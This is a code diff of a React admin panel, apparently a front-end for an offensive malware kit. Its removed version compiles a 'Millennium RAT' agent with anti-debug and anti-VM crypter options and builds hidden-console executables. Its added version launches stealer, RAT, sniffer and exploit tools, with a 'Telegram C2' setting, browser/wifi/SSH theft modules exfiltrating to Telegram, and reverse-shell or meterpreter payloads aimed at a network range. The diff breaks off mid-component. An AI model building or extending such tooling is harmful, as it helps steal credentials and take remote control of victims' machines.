@@ -1,557 +1,475 @@
-import { useState } from "react";
-import { useMutation, useQuery } from "@tanstack/react-query";
+import { useState, useEffect } from "react";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
-import { Textarea } from "@/components/ui/textarea";
 import { Badge } from "@/components/ui/badge";
-import { ScrollArea } from "@/components/ui/scroll-area";
-import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { useToast } from "@/hooks/use-toast";
-import { apiRequest } from "@/lib/queryClient";
+import { Input } from "@/components/ui/input";
+import { Textarea } from "@/components/ui/textarea";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Alert, AlertDescription } from "@/components/ui/alert";
 import { 
   Terminal, 
   Play, 
+  Square, 
   Download, 
-  FileCode, 
-  Settings,
+  Settings, 
+  Activity,
+  Zap,
+  Shield,
+  Network,
+  Database,
+  AlertTriangle,
   CheckCircle,
-  XCircle,
-  Clock
+  Send
 } from "lucide-react";
+import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
+
+interface PythonTool {
+  id: string;
+  name: string;
+  description: string;
+  script: string;
+  category: 'sniffer' | 'stealer' | 'rat' | 'exploit' | 'recon';
+  status: 'idle' | 'running' | 'completed' | 'failed';
+  lastRun?: Date;
+  telegramEnabled: boolean;
+}
+
+interface ToolExecution {
+  id: string;
+  toolId: string;
+  status: 'running' | 'completed' | 'failed';
+  output: string;
+  startTime: Date;
+  endTime?: Date;
+  telegramAlerts: boolean;
+}
+
+interface TelegramConfig {
+  botToken: string;
+  chatId: string;
+  alertsEnabled: boolean;
+}
 
 export default function PythonToolkitManager() {
-  const { toast } = useToast();
-  const [activeTab, setActiveTab] = useState("millennium");
-  const [millenniumConfig, setMillenniumConfig] = useState({
-    serverIp: "127.0.0.1",
-    serverPort: "8888",
-    outputName: "millennium_agent",
-    crypter: {
-      enabled: true,
-      antiDebug: true,
-      antiVM: true,
-      compression: true
-    }
+  const [selectedTool, setSelectedTool] = useState<string>('');
+  const [toolParameters, setToolParameters] = useState<Record<string, string>>({});
+  const [executionOutput, setExecutionOutput] = useState<string>('');
+  const [telegramConfig, setTelegramConfig] = useState<TelegramConfig>({
+    botToken: '',
+    chatId: '',
+    alertsEnabled: false
   });
-  const [eliteConfig, setEliteConfig] = useState({
-    outputDir: "elite_cybersecurity_toolkit"
-  });
-  const [buildConfig, setBuildConfig] = useState({
-    scriptName: "",
-    outputName: "",
-    options: {
-      onefile: true,
-      windowed: false,
-      noconsole: false,
-      hiddenImports: ""
-    }
-  });
-  const [executionOutput, setExecutionOutput] = useState("");
+  const [showTelegramConfig, setShowTelegramConfig] = useState(false);
 
-  // Get available Python tools
-  const { data: toolsData } = useQuery({
-    queryKey: ["/api/admin/python-tools"],
-    refetchInterval: 30000, // Refresh every 30 seconds
-  });
+  const queryClient = useQueryClient();
 
-  // Millennium agent compilation
-  const millenniumMutation = useMutation({
-    mutationFn: async (config: typeof millenniumConfig) => {
-      const response = await apiRequest("POST", "/api/admin/compile-millennium-agent", config);
+  // Fetch available Python tools
+  const { data: tools = [], isLoading } = useQuery({
+    queryKey: ['python-tools'],
+    queryFn: async () => {
+      const response = await fetch('/api/admin/python-tools');
+      if (!response.ok) throw new Error('Failed to fetch tools');
       return response.json();
     },
-    onSuccess: (data) => {
-      setExecutionOutput(data.output || "");
-      if (data.success) {
-        toast({
-          title: "Millennium Agent Compiled",
-          description: `Agent created at: ${data.path}`,
-        });
-      } else {
-        toast({
-          title: "Compilation Failed",
-          description: data.error || "Unknown error occurred",
-          variant: "destructive",
-        });
-      }
-    },
-    onError: () => {
-      toast({
-        title: "Execution Error",
-        description: "Failed to compile Millennium agent",
-        variant: "destructive",
-      });
-    },
+    refetchInterval: 5000 // Refresh every 5 seconds
   });
 
-  // Elite toolkit build
-  const eliteMutation = useMutation({
-    mutationFn: async (config: typeof eliteConfig) => {
-      const response = await apiRequest("POST", "/api/admin/build-elite-toolkit", config);
+  // Fetch active executions
+  const { data: executions = [] } = useQuery({
+    queryKey: ['tool-executions'],
+    queryFn: async () => {
+      const response = await fetch('/api/admin/tool-executions');
+      if (!response.ok) throw new Error('Failed to fetch executions');
       return response.json();
     },
-    onSuccess: (data) => {
-      setExecutionOutput(data.output || "");
-      if (data.success) {
-        toast({
-          title: "Elite Toolkit Built",
-          description: data.message || "Toolkit created successfully",
-        });
-      } else {
-        toast({
-          title: "Build Failed",
-          description: data.error || "Unknown error occurred",
-          variant: "destructive",
-        });
-      }
-    },
-    onError: () => {
-      toast({
-        title: "Execution Error",
-        description: "Failed to build Elite toolkit",
-        variant: "destructive",
-      });
-    },
+    refetchInterval: 2000 // Refresh every 2 seconds for real-time updates
   });
 
-  // Executable build
-  const buildMutation = useMutation({
-    mutationFn: async (config: typeof buildConfig) => {
-      const response = await apiRequest("POST", "/api/admin/build-executable", config);
+  // Execute tool mutation
+  const executeTool = useMutation({
+    mutationFn: async (params: { toolId: string; parameters: Record<string, string>; telegramConfig?: TelegramConfig }) => {
+      const response = await fetch('/api/admin/execute-tool', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(params)
+      });
+      if (!response.ok) throw new Error('Failed to execute tool');
       return response.json();
     },
-    onSuccess: (data) => {
-      setExecutionOutput(data.output || "");
-      if (data.success) {
-        toast({
-          title: "Executable Built",
-          description: data.message || "Executable created successfully",
-        });
-      } else {
-        toast({
-          title: "Build Failed",
-          description: data.error || "Unknown error occurred",
-          variant: "destructive",
-        });
-      }
-    },
-    onError: () => {
-      toast({
-        title: "Build Error",
-        description: "Failed to build executable",
-        variant: "destructive",
-      });
-    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ['tool-executions'] });
+      setExecutionOutput('Tool execution started...');
+    }
   });
 
-  const handleMillenniumCompile = () => {
-    millenniumMutation.mutate(millenniumConfig);
-  };
-
-  const handleEliteBuild = () => {
-    eliteMutation.mutate(eliteConfig);
-  };
-
-  const handleExecutableBuild = () => {
-    if (!buildConfig.scriptName) {
-      toast({
-        title: "Script Required",
-        description: "Please select a script to build",
-        variant: "destructive",
+  // Stop execution mutation
+  const stopExecution = useMutation({
+    mutationFn: async (executionId: string) => {
+      const response = await fetch(`/api/admin/stop-execution/${executionId}`, {
+        method: 'POST'
       });
-      return;
+      if (!response.ok) throw new Error('Failed to stop execution');
+      return response.json();
+    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ['tool-executions'] });
     }
-    buildMutation.mutate(buildConfig);
+  });
+
+  // Configure Telegram integration
+  const configureTelegram = useMutation({
+    mutationFn: async (config: TelegramConfig) => {
+      const response = await fetch('/api/admin/configure-telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(config)
+      });
+      if (!response.ok) throw new Error('Failed to configure Telegram');
+      return response.json();
+    },
+    onSuccess: () => {
+      setShowTelegramConfig(false);
+    }
+  });
+
+  const handleExecuteTool = () => {
+    if (!selectedTool) return;
+
+    const params = {
+      toolId: selectedTool,
+      parameters: toolParameters,
+      telegramConfig: telegramConfig.alertsEnabled ? telegramConfig : undefined
+    };
+
+    executeTool.mutate(params);
   };
 
-  const formatFileSize = (bytes: number) => {
-    if (bytes === 0) return '0 Bytes';
-    const k = 1024;
-    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+  const handleStopExecution = (executionId: string) => {
+    stopExecution.mutate(executionId);
   };
 
-  const getExecutionStatus = () => {
-    if (millenniumMutation.isPending || eliteMutation.isPending || buildMutation.isPending) {
-      return { icon: Clock, color: "text-yellow-500", text: "EXECUTING" };
+  const getCategoryIcon = (category: string) => {
+    switch (category) {
+      case 'sniffer': return <Network className="w-4 h-4" />;
+      case 'stealer': return <Database className="w-4 h-4" />;
+      case 'rat': return <Terminal className="w-4 h-4" />;
+      case 'exploit': return <Zap className="w-4 h-4" />;
+      case 'recon': return <Shield className="w-4 h-4" />;
+      default: return <Activity className="w-4 h-4" />;
     }
-    if (millenniumMutation.isSuccess || eliteMutation.isSuccess || buildMutation.isSuccess) {
-      return { icon: CheckCircle, color: "text-green-500", text: "SUCCESS" };
-    }
-    if (millenniumMutation.isError || eliteMutation.isError || buildMutation.isError) {
-      return { icon: XCircle, color: "text-red-500", text: "FAILED" };
-    }
-    return { icon: Terminal, color: "text-matrix", text: "READY" };
   };
 
-  const status = getExecutionStatus();
-  const StatusIcon = status.icon;
+  const getStatusColor = (status: string) => {
+    switch (status) {
+      case 'running': return 'bg-yellow-500/20 text-yellow-400';
+      case 'completed': return 'bg-green-500/20 text-green-400';
+      case 'failed': return 'bg-red-500/20 text-red-400';
+      default: return 'bg-gray-500/20 text-gray-400';
+    }
+  };
+
+  const renderToolParameters = () => {
+    const tool = tools.find((t: PythonTool) => t.id === selectedTool);
+    if (!tool) return null;
+
+    const commonParams = {
+      'sniffer': [
+        { key: 'interface', label: 'Network Interface', type: 'text', default: 'all' },
+        { key: 'duration', label: 'Duration (seconds)', type: 'number', default: '300' },
+        { key: 'protocols', label: 'Protocols', type: 'text', default: 'HTTP,HTTPS,FTP' }
+      ],
+      'stealer': [
+        { key: 'modules', label: 'Collection Modules', type: 'text', default: 'browser,wifi,ssh' },
+        { key: 'exfiltrate', label: 'Exfiltration Method', type: 'select', options: ['telegram', 'http', 'file'], default: 'telegram' }
+      ],
+      'rat': [
+        { key: 'port', label: 'C2 Port', type: 'number', default: '8888' },
+        { key: 'interface', label: 'Bind Interface', type: 'text', default: '0.0.0.0' }
+      ],
+      'exploit': [
+        { key: 'target', label: 'Target IP/Range', type: 'text', default: '192.168.1.0/24' },
+        { key: 'payload', label: 'Payload Type', type: 'select', options: ['reverse_shell', 'bind_shell', 'meterpreter'], default: 'reverse_shell' }
+      ],
+      'recon': [
+        { key: 'target', label: 'Target', type: 'text', default: 'localhost' },
+        { key: 'scan_type', label: 'Scan Type', type: 'select', options: ['fast', 'full', 'stealth'], default: 'fast' }
+      ]
+    };
+
+    const params = commonParams[tool.category as keyof typeof commonParams] || [];
+
+    return (
+      <div className="space-y-4">
+        {params.map((param) => (
+          <div key={param.key} className="space-y-2">
+            <label className="text-sm font-medium text-matrix">{param.label}</label>
+            {param.type === 'select' ? (
+              <Select 
+                value={toolParameters[param.key] || param.default}
+                onValueChange={(value) => setToolParameters(prev => ({ ...prev, [param.key]: value }))}
+              >
+                <SelectTrigger className="bg-terminal border-matrix/30">
+                  <SelectValue />
+                </SelectTrigger>
+                <SelectContent>
+                  {param.options?.map((option) => (
+                    <SelectItem key={option} value={option}>{option}</SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            ) : (
+              <Input
+                type={param.type}
+                value={toolParameters[param.key] || param.default}
+                onChange={(e) => setToolParameters(prev => ({ ...prev, [param.key]: e.target.value }))}
+                className="bg-terminal border-matrix/30 text-matrix"
+                placeholder={param.default}
+              />
+            )}
+          </div>
+        ))}
+      </div>
+    );
+  };
+
+  if (isLoading) {
+    return (
+      <div className="flex items-center justify-center h-64">
+        <div className="text-matrix">Loading toolkit...</div>
+      </div>
+    );
+  }
 
   return (
     <div className="space-y-6">
-      <Card className="bg-terminal border-matrix">
-        <CardHeader>
-          <CardTitle className="text-matrix flex items-center gap-2">
-            <Terminal className="w-5 h-5" />
-            Python Cybersecurity Toolkit Manager
-            <Badge className={`ml-auto ${status.color} bg-black/50 font-mono text-xs`}>
-              <StatusIcon className="w-3 h-3 mr-1" />
-              {status.text}
-            </Badge>
-          </CardTitle>
-        </CardHeader>
-        <CardContent>
-          <Tabs value={activeTab} onValueChange={setActiveTab}>
-            <TabsList className="bg-black border-matrix">
-              <TabsTrigger value="millennium" className="text-matrix">Millennium RAT</TabsTrigger>
-              <TabsTrigger value="elite" className="text-matrix">Elite Toolkit</TabsTrigger>
-              <TabsTrigger value="build" className="text-matrix">EXE Builder</TabsTrigger>
-              <TabsTrigger value="tools" className="text-matrix">Available Tools</TabsTrigger>
-              <TabsTrigger value="output" className="text-matrix">Execution Output</TabsTrigger>
-            </TabsList>
-
-            <TabsContent value="millennium" className="space-y-4">
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <Label htmlFor="serverIp" className="text-matrix">Server IP</Label>
-                  <Input
-                    id="serverIp"
-                    value={millenniumConfig.serverIp}
-                    onChange={(e) => setMillenniumConfig(prev => ({ ...prev, serverIp: e.target.value }))}
-                    className="bg-black border-matrix text-matrix"
-                    placeholder="127.0.0.1"
-                  />
-                </div>
-                <div>
-                  <Label htmlFor="serverPort" className="text-matrix">Server Port</Label>
-                  <Input
-                    id="serverPort"
-                    value={millenniumConfig.serverPort}
-                    onChange={(e) => setMillenniumConfig(prev => ({ ...prev, serverPort: e.target.value }))}
-                    className="bg-black border-matrix text-matrix"
-                    placeholder="8888"
-                  />
-                </div>
-              </div>
-
-              <div>
-                <Label htmlFor="outputName" className="text-matrix">Output Name</Label>
-                <Input
-                  id="outputName"
-                  value={millenniumConfig.outputName}
-                  onChange={(e) => setMillenniumConfig(prev => ({ ...prev, outputName: e.target.value }))}
-                  className="bg-black border-matrix text-matrix"
-                  placeholder="millennium_agent"
-                />
-              </div>
-
-              <div className="space-y-2">
-                <Label className="text-matrix flex items-center gap-2">
-                  <Settings className="w-4 h-4" />
-                  Crypter Options
-                </Label>
-                <div className="grid grid-cols-4 gap-4 p-4 border border-matrix/30 rounded">
-                  <div className="flex items-center space-x-2">
-                    <input
-                      type="checkbox"
-                      id="crypterEnabled"
-                      checked={millenniumConfig.crypter.enabled}
-                      onChange={(e) => setMillenniumConfig(prev => ({ 
-                        ...prev, 
-                        crypter: { ...prev.crypter, enabled: e.target.checked }
-                      }))}
-                      className="text-matrix"
-                    />
-                    <Label htmlFor="crypterEnabled" className="text-matrix text-sm">Enable</Label>
-                  </div>
-                  <div className="flex items-center space-x-2">
-                    <input
-                      type="checkbox"
-                      id="antiDebug"
-                      checked={millenniumConfig.crypter.antiDebug}
-                      onChange={(e) => setMillenniumConfig(prev => ({ 
-                        ...prev, 
-                        crypter: { ...prev.crypter, antiDebug: e.target.checked }
-                      }))}
-                      disabled={!millenniumConfig.crypter.enabled}
-                      className="text-matrix"
-                    />
-                    <Label htmlFor="antiDebug" className="text-matrix text-sm">Anti-Debug</Label>
-                  </div>
-                  <div className="flex items-center space-x-2">
-                    <input
-                      type="checkbox"
-                      id="antiVM"
-                      checked={millenniumConfig.crypter.antiVM}
-                      onChange={(e) => setMillenniumConfig(prev => ({ 
-                        ...prev, 
-                        crypter: { ...prev.crypter, antiVM: e.target.checked }
-                      }))}
-                      disabled={!millenniumConfig.crypter.enabled}
-                      className="text-matrix"
-                    />
-                    <Label htmlFor="antiVM" className="text-matrix text-sm">Anti-VM</Label>
-                  </div>
-                  <div className="flex items-center space-x-2">
-                    <input
-                      type="checkbox"
-                      id="compression"
-                      checked={millenniumConfig.crypter.compression}
-                      onChange={(e) => setMillenniumConfig(prev => ({ 
-                        ...prev, 
-                        crypter: { ...prev.crypter, compression: e.target.checked }
-                      }))}
-                      disabled={!millenniumConfig.crypter.enabled}
-                      className="text-matrix"
-                    />
-                    <Label htmlFor="compression" className="text-matrix text-sm">Compression</Label>
-                  </div>
-                </div>
-              </div>
-
-              <Button 
-                onClick={handleMillenniumCompile} 
-                disabled={millenniumMutation.isPending}
-                className="w-full bg-matrix text-black hover:bg-matrix/80"
+      {/* Telegram Configuration */}
+      {showTelegramConfig && (
+        <Card className="bg-panel border-matrix/20">
+          <CardHeader>
+            <CardTitle className="text-matrix flex items-center">
+              <Send className="w-5 h-5 mr-2" />
+              Telegram C2 Configuration
+            </CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <div className="space-y-2">
+              <label className="text-sm font-medium text-matrix">Bot Token</label>
+              <Input
+                type="password"
+                value={telegramConfig.botToken}
+                onChange={(e) => setTelegramConfig(prev => ({ ...prev, botToken: e.target.value }))}
+                className="bg-terminal border-matrix/30 text-matrix"
+                placeholder="Enter Telegram bot token"
+              />
+            </div>
+            <div className="space-y-2">
+              <label className="text-sm font-medium text-matrix">Chat ID</label>
+              <Input
+                value={telegramConfig.chatId}
+                onChange={(e) => setTelegramConfig(prev => ({ ...prev, chatId: e.target.value }))}
+                className="bg-terminal border-matrix/30 text-matrix"
+                placeholder="Enter chat ID for alerts"
+              />
+            </div>
+            <div className="flex items-center space-x-2">
+              <input
+                type="checkbox"
+                checked={telegramConfig.alertsEnabled}
+                onChange={(e) => setTelegramConfig(prev => ({ ...prev, alertsEnabled: e.target.checked }))}
+                className="rounded border-matrix/30"
+              />
+              <label className="text-sm text-matrix">Enable real-time alerts</label>
+            </div>
+            <div className="flex space-x-2">
+              <Button
+                onClick={() => configureTelegram.mutate(telegramConfig)}
+                disabled={configureTelegram.isPending}
+                className="bg-matrix/20 hover:bg-matrix/30 text-matrix border-matrix/30"
               >
-                {millenniumMutation.isPending ? (
-                  <>
-                    <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin mr-2" />
-                    Compiling Agent...
-                  </>
-                ) : (
-                  <>
-                    <Play className="w-4 h-4 mr-2" />
-                    Compile Millennium Agent
-                  </>
-                )}
+                Save Configuration
               </Button>
-            </TabsContent>
-
-            <TabsContent value="elite" className="space-y-4">
-              <div>
-                <Label htmlFor="eliteOutputDir" className="text-matrix">Output Directory</Label>
-                <Input
-                  id="eliteOutputDir"
-                  value={eliteConfig.outputDir}
-                  onChange={(e) => setEliteConfig(prev => ({ ...prev, outputDir: e.target.value }))}
-                  className="bg-black border-matrix text-matrix"
-                  placeholder="elite_cybersecurity_toolkit"
-                />
-              </div>
-
-              <div className="p-4 border border-matrix/30 rounded bg-black/30">
-                <h4 className="text-matrix font-mono mb-2">Elite Toolkit Components:</h4>
-                <ul className="text-gray-400 text-sm space-y-1">
-                  <li>• Advanced Crypter - File encryption and obfuscation</li>
-                  <li>• Advanced Binder - Multi-file binding capabilities</li>
-                  <li>• Advanced Stealer - System information gathering</li>
-                  <li>• Advanced RAT - Remote access tool with C&C server</li>
-                </ul>
-              </div>
-
-              <Button 
-                onClick={handleEliteBuild} 
-                disabled={eliteMutation.isPending}
-                className="w-full bg-matrix text-black hover:bg-matrix/80"
+              <Button
+                variant="outline"
+                onClick={() => setShowTelegramConfig(false)}
+                className="border-matrix/30 text-matrix"
               >
-                {eliteMutation.isPending ? (
-                  <>
-                    <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin mr-2" />
-                    Building Toolkit...
-                  </>
-                ) : (
-                  <>
-                    <Download className="w-4 h-4 mr-2" />
-                    Build Elite Toolkit
-                  </>
-                )}
+                Cancel
               </Button>
-            </TabsContent>
+            </div>
+          </CardContent>
+        </Card>
+      )}
 
-            <TabsContent value="build" className="space-y-4">
-              <div className="grid grid-cols-2 gap-4">
-                <div>
-                  <Label htmlFor="scriptSelect" className="text-matrix">Select Script</Label>
-                  <select
-                    id="scriptSelect"
-                    value={buildConfig.scriptName}
-                    onChange={(e) => setBuildConfig(prev => ({ ...prev, scriptName: e.target.value }))}
-                    className="w-full bg-black border border-matrix text-matrix rounded px-3 py-2"
-                  >
-                    <option value="">Choose a Python script...</option>
-                    {toolsData?.tools?.map((tool: any) => (
-                      <option key={tool.name} value={tool.name}>
-                        {tool.name}
-                      </option>
-                    ))}
-                  </select>
-                </div>
-                <div>
-                  <Label htmlFor="executableName" className="text-matrix">Executable Name</Label>
-                  <Input
-                    id="executableName"
-                    value={buildConfig.outputName}
-                    onChange={(e) => setBuildConfig(prev => ({ ...prev, outputName: e.target.value }))}
-                    className="bg-black border-matrix text-matrix"
-                    placeholder="my_executable"
-                  />
-                </div>
+      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        {/* Tool Selection and Configuration */}
+        <Card className="bg-panel border-matrix/20">
+          <CardHeader>
+            <CardTitle className="text-matrix flex items-center justify-between">
+              <div className="flex items-center">
+                <Terminal className="w-5 h-5 mr-2" />
+                Python Red Team Toolkit
               </div>
-
-              <div className="space-y-4">
-                <Label className="text-matrix flex items-center gap-2">
-                  <Settings className="w-4 h-4" />
-                  PyInstaller Options
-                </Label>
-                
-                <div className="grid grid-cols-2 gap-4 p-4 border border-matrix/30 rounded">
-                  <div className="flex items-center space-x-2">
-                    <input
-                      type="checkbox"
-                      id="onefile"
-                      checked={buildConfig.options.onefile}
-                      onChange={(e) => setBuildConfig(prev => ({ 
-                        ...prev, 
-                        options: { ...prev.options, onefile: e.target.checked }
-                      }))}
-                      className="text-matrix"
-                    />
-                    <Label htmlFor="onefile" className="text-matrix text-sm">One File</Label>
-                  </div>
-                  
-                  <div className="flex items-center space-x-2">
-                    <input
-                      type="checkbox"
-                      id="windowed"
-                      checked={buildConfig.options.windowed}
-                      onChange={(e) => setBuildConfig(prev => ({ 
-                        ...prev, 
-                        options: { ...prev.options, windowed: e.target.checked }
-                      }))}
-                      className="text-matrix"
-                    />
-                    <Label htmlFor="windowed" className="text-matrix text-sm">Windowed</Label>
-                  </div>
-                  
-                  <div className="flex items-center space-x-2">
-                    <input
-                      type="checkbox"
-                      id="noconsole"
-                      checked={buildConfig.options.noconsole}
-                      onChange={(e) => setBuildConfig(prev => ({ 
-                        ...prev, 
-                        options: { ...prev.options, noconsole: e.target.checked }
-                      }))}
-                      className="text-matrix"
-                    />
-                    <Label htmlFor="noconsole" className="text-matrix text-sm">No Console</Label>
-                  </div>
-                </div>
-
-                <div>
-                  <Label htmlFor="hiddenImports" className="text-matrix">Hidden Imports (comma-separated)</Label>
-                  <Input
-                    id="hiddenImports"
-                    value={buildConfig.options.hiddenImports}
-                    onChange={(e) => setBuildConfig(prev => ({ 
-                      ...prev, 
-                      options: { ...prev.options, hiddenImports: e.target.value }
-                    }))}
-                    className="bg-black border-matrix text-matrix"
-                    placeholder="module1,module2,module3"
-                  />
-                </div>
-
-                <div className="p-4 border border-matrix/30 rounded bg-black/30">
-                  <h4 className="text-matrix font-mono mb-2">PyInstaller Build Options:</h4>
-                  <ul className="text-gray-400 text-sm space-y-1">
-                    <li>• <span className="text-matrix">One File:</span> Bundle everything into a single executable</li>
-                    <li>• <span className="text-matrix">Windowed:</span> Do not provide a console window for standard I/O</li>
-                    <li>• <span className="text-matrix">No Console:</span> Hide the console window (Windows only)</li>
-                    <li>• <span className="text-matrix">Hidden Imports:</span> Manually specify modules PyInstaller might miss</li>
-                  </ul>
-                </div>
-              </div>
-
-              <Button 
-                onClick={handleExecutableBuild} 
-                disabled={buildMutation.isPending || !buildConfig.scriptName}
-                className="w-full bg-matrix text-black hover:bg-matrix/80"
+              <Button
+                variant="outline"
+                size="sm"
+                onClick={() => setShowTelegramConfig(true)}
+                className="border-matrix/30 text-matrix"
               >
-                {buildMutation.isPending ? (
-                  <>
-                    <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin mr-2" />
-                    Building Executable...
-                  </>
-                ) : (
-                  <>
-                    <Download className="w-4 h-4 mr-2" />
-                    Build Executable
-                  </>
-                )}
+                <Send className="w-4 h-4 mr-1" />
+                Telegram
               </Button>
-            </TabsContent>
-
-            <TabsContent value="tools" className="space-y-4">
-              <div className="grid gap-4">
-                {toolsData?.tools?.map((tool: any) => (
-                  <Card key={tool.name} className="bg-black/50 border-matrix/30">
-                    <CardContent className="p-4">
-                      <div className="flex items-center justify-between">
-                        <div className="flex items-center gap-3">
-                          <FileCode className="w-5 h-5 text-matrix" />
-                          <div>
-                            <h4 className="text-matrix font-mono">{tool.name}</h4>
-                            <p className="text-gray-400 text-sm">
-                              {formatFileSize(tool.size)} • Modified: {new Date(tool.modified).toLocaleDateString()}
-                            </p>
-                          </div>
-                        </div>
-                        <Badge className="bg-matrix/20 text-matrix font-mono text-xs">
-                          PYTHON
+            </CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <div className="space-y-2">
+              <label className="text-sm font-medium text-matrix">Select Tool</label>
+              <Select value={selectedTool} onValueChange={setSelectedTool}>
+                <SelectTrigger className="bg-terminal border-matrix/30">
+                  <SelectValue placeholder="Choose a red team tool" />
+                </SelectTrigger>
+                <SelectContent>
+                  {tools.map((tool: PythonTool) => (
+                    <SelectItem key={tool.id} value={tool.id}>
+                      <div className="flex items-center space-x-2">
+                        {getCategoryIcon(tool.category)}
+                        <span>{tool.name}</span>
+                        <Badge variant="outline" className="ml-2">
+                          {tool.category}
                         </Badge>
                       </div>
-                    </CardContent>
-                  </Card>
-                )) || (
-                  <div className="text-center py-8 text-gray-400">
-                    <FileCode className="w-12 h-12 mx-auto mb-4 opacity-50" />
-                    <p>No Python tools found</p>
-                  </div>
-                )}
-              </div>
-            </TabsContent>
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            </div>
 
-            <TabsContent value="output" className="space-y-4">
-              <div className="space-y-2">
-                <Label className="text-matrix">Execution Output</Label>
-                <ScrollArea className="h-[400px] w-full border border-matrix/30 rounded">
-                  <Textarea
-                    value={executionOutput}
-                    readOnly
-                    className="min-h-[390px] bg-black border-none text-green-400 font-mono text-sm resize-none"
-                    placeholder="Script execution output will appear here..."
-                  />
-                </ScrollArea>
-              </div>
-              
-              {executionOutput && (
-                <Button
-                  onClick={() => setExecutionOutput("")}
-                  variant="outline"
-                  className="border-matrix text-matrix hover:bg-matrix/10"
-                >
-                  Clear Output
-                </Button>
+            {selectedTool && (
+              <>
+                <div className="p-3 bg-terminal rounded border border-matrix/30">
+                  <p className="text-sm text-gray-300">
+                    {tools.find((t: PythonTool) => t.id === selectedTool)?.description}
+                  </p>
+                </div>
+
+                {renderToolParameters()}
+
+                <div className="flex space-x-2">
+                  <Button
+                    onClick={handleExecuteTool}
+                    disabled={executeTool.isPending}
+                    className="bg-matrix/20 hover:bg-matrix/30 text-matrix border-matrix/30 flex-1"
+                  >
+                    <Play className="w-4 h-4 mr-2" />
+                    {executeTool.isPending ? 'Executing...' : 'Execute Tool'}
+                  </Button>
+                  <Button
+                    variant="outline"
+                    onClick={() => setExecutionOutput('')}
+                    className="border-matrix/30 text-matrix"
+                  >
+                    Clear
+                  </Button>
+                </div>
+              </>
+            )}
+          </CardContent>
+        </Card>
+
+        {/* Real-time Execution Monitor */}
+        <Card className="bg-panel border-matrix/20">
+          <CardHeader>
+            <CardTitle className="text-matrix flex items-center">
+              <Activity className="w-5 h-5 mr-2" />
+              Active Operations
+              <Badge className="ml-2 bg-matrix/20 text-matrix">
+                {executions.filter((e: ToolExecution) => e.status === 'running').length} Running
+              </Badge>
+            </CardTitle>
+          </CardHeader>
+          <CardContent>
+            <div className="space-y-3 max-h-96 overflow-y-auto">
+              {executions.length === 0 ? (
+                <div className="text-center text-gray-500 py-8">
+                  No active operations
+                </div>
+              ) : (
+                executions.map((execution: ToolExecution) => (
+                  <div key={execution.id} className="p-3 bg-terminal rounded border border-matrix/30">
+                    <div className="flex items-center justify-between mb-2">
+                      <div className="flex items-center space-x-2">
+                        <Badge className={getStatusColor(execution.status)}>
+                          {execution.status === 'running' && <Activity className="w-3 h-3 mr-1 animate-spin" />}
+                          {execution.status === 'completed' && <CheckCircle className="w-3 h-3 mr-1" />}
+                          {execution.status === 'failed' && <AlertTriangle className="w-3 h-3 mr-1" />}
+                          {execution.status.toUpperCase()}
+                        </Badge>
+                        <span className="text-sm text-matrix">{execution.id}</span>
+                      </div>
+                      {execution.status === 'running' && (
+                        <Button
+                          size="sm"
+                          variant="outline"
+                          onClick={() => handleStopExecution(execution.id)}
+                          className="border-red-500/30 text-red-400 hover:bg-red-500/10"
+                        >
+                          <Square className="w-3 h-3 mr-1" />
+                          Stop
+                        </Button>
+                      )}
+                    </div>
+                    <div className="text-xs text-gray-400 mb-1">
+                      Started: {new Date(execution.startTime).toLocaleString()}
+                      {execution.endTime && (
+                        <> | Completed: {new Date(execution.endTime).toLocaleString()}</>
+                      )}
+                    </div>
+                    {execution.output && (
+                      <div className="text-xs font-mono text-gray-300 bg-black/20 p-2 rounded max-h-20 overflow-y-auto">
+                        {execution.output.split('\n').slice(-5).join('\n')}
+                      </div>
+                    )}
+                    {execution.telegramAlerts && (
+                      <div className="flex items-center mt-2 text-xs text-blue-400">
+                        <Send className="w-3 h-3 mr-1" />
+                        Telegram alerts enabled
+                      </div>
+                    )}
+                  </div>
+                ))
               )}
-            </TabsContent>
-          </Tabs>
-        </CardContent>
-      </Card>
+            </div>
+          </CardContent>
+        </Card>
+      </div>
+
+      {/* Tool Categories Overview */}
+      <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
+        {[
+          { category: 'sniffer', label: 'Network Sniffers', icon: Network, count: tools.filter((t: PythonTool) => t.category === 'sniffer').length },
+          { category: 'stealer', label: 'Data Stealers', icon: Database, count: tools.filter((t: PythonTool) => t.category === 'stealer').length },
+          { category: 'rat', label: 'RAT Tools', icon: Terminal, count: tools.filter((t: PythonTool) => t.category === 'rat').length },
+          { category: 'exploit', label: 'Exploit Kits', icon: Zap, count: tools.filter((t: PythonTool) => t.category === 'exploit').length },
+          { category: 'recon', label: 'Reconnaissance', icon: Shield, count: tools.filter((t: PythonTool) => t.category === 'recon').length }
+        ].map((cat) => (
+          <Card key={cat.category} className="bg-panel border-matrix/20">
+            <CardContent className="p-4 text-center">
+              <cat.icon className="w-8 h-8 mx-auto mb-2 text-matrix" />
+              <div className="text-lg font-bold text-matrix">{cat.count}</div>
+              <div className="text-xs text-gray-400">{cat.label}</div>
+            </CardContent>
+          </Card>
+        ))}
+      </div>
+
+      {/* Advanced Features Alert */}
+      <Alert className="border-matrix/20 bg-panel">
